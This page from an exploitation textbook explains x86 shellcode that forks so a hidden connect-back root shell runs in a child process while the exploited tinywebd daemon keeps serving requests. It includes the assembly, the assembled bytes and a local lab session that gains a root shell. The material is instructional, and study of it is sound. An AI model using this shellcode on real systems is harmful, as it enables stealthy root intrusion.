<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x653 Child Laborers</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part141.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part143.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark129">0x653 Child Laborers</a></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Now that the difficult part is figured out, we can use this technique to silently spawn a root shell. Since the shell is interactive, but we still want the process to handle web requests, we need to fork to a child process. The <span class="s31">fork() </span>call creates a child process that is an exact copy of the parent, except that it returns <span class="s31">0 </span>in the child process and the new process ID in the parent process. We want our shellcode to fork and the child process to serve up the root shell, while the parent process restores tinywebd’s execution. In the shellcode below, several instructions are added to the start of loopback_shell.s. First, the fork syscall is made, and the return value is put in the EAX register. The next few instructions test to see if EAX is zero. If EAX is zero, we jump to <span class="s31">child_process </span>to spawn the shell. Otherwise, we’re in the parent process, so the shellcode restores execution into tinywebd.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">loopback_shell_restore.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1055.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">push BYTE 0x02  ; Fork is syscall #2 pop eax</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">int 0x80     ; After the fork, in child process eax == 0. test eax, eax</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">jz child_process ; In child process spawns a shell.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;line-height: 106%;text-align: left;">; In the parent process, restore tinywebd. lea ebp, [esp+0x68] ; Restore EBP. push 0x08048fb7   ; Return address. ret        ; Return</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">child_process:</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; s = socket(2, 1, 0)</p><p class="s31" style="padding-left: 100pt;text-indent: 0pt;line-height: 107%;text-align: left;">push BYTE 0x66  ; Socketcall is syscall #102 (0x66) pop eax</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">cdq       ; Zero out edx for use as a null DWORD later. xor ebx, ebx   ; ebx is the type of socketcall.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 10pt;text-align: left;">inc ebx      ; 1 = SYS_SOCKET = socket()</p><p class="s31" style="padding-top: 2pt;padding-left: 99pt;text-indent: 0pt;line-height: 106%;text-align: left;">push edx      ; Build arg array: { protocol = 0, push BYTE 0x1   ;  (in reverse)   SOCK_STREAM = 1, push BYTE 0x2   ;           AF_INET = 2 }</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov ecx, esp   ; ecx = ptr to argument array</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80     ; After syscall, eax has socket file descriptor.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;text-align: left;">.: [ Output trimmed; the rest is the same as loopback_shell.s. ] :.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1056.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The following listing shows this shellcode in use. Multiple jobs are used instead of multiple terminals, so the netcat listener is sent to the background by ending the command with an ampersand (<span class="s31">&amp;</span>). After the shell connects back, the <span class="s31">fg </span>command brings the listener back to the foreground. The process is then suspended by hitting <span class="s7">CTRL</span>-Z, which returns to the BASH shell. It might be easier for you to use multiple terminals as you are following along, but job control is useful to know for those times when you don’t have the luxury of multiple terminals.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1057.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ nasm loopback_shell_restore.s reader@hacking:~/booksrc $ hexdump -C loopback_shell_restore</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000000 6a 02 58 cd 80 85 c0 74 0a 8d 6c 24 68 68 b7 8f |j.X..t.l$hh.|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000010 04 08 c3 6a 66 58 99 31 db 43 52 6a 01 6a 02 89 |..jfX.1.CRj.j.|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000020 e1 cd 80 96 6a 66 58 43 68 7f bb bb 01 66 89 54 |..jfXCh..f.T|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000030 24 01 66 68 7a 69 66 53 89 e1 6a 10 51 56 89 e1 |$.fhzifS.j.QV.|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000040 43 cd 80 87 f3 87 ce 49 b0 3f cd 80 49 79 f9 b0 |C...I.?.Iy.|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000050 0b 52 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 52 89 |.Rh//shh/bin.R.|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000060  e2 53 89 e1 cd 80                 |.S..|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000066</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./tinywebd Starting tiny web daemon. reader@hacking:~/booksrc $ nc -l -p 31337 &amp;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[1] 27279</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh loopback_shell_restore 127.0.0.1 target IP: 127.0.0.1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">shellcode: loopback_shell_restore (102 bytes) fake request: &quot;GET / HTTP/1.1\x00&quot; (15 bytes)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[Fake Request (15 b)] [NOP (299 b)] [shellcode (102 b)] [ret addr (128 b)] localhost [127.0.0.1] 80 (www) open</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ fg nc -l -p 31337</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">whoami root</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[1]+ Stopped        nc -l -p 31337 reader@hacking:~/booksrc $ ./webserver_id 127.0.0.1 The web server for 127.0.0.1 is Tiny webserver reader@hacking:~/booksrc $ fg</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">nc -l -p 31337 whoami</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">root</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1058.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">With this shellcode, the connect-back root shell is maintained by a separate child process, while the parent process continues to serve web content.</p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part143.htm">0x660 Advanced Camouflage</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part141.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part143.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
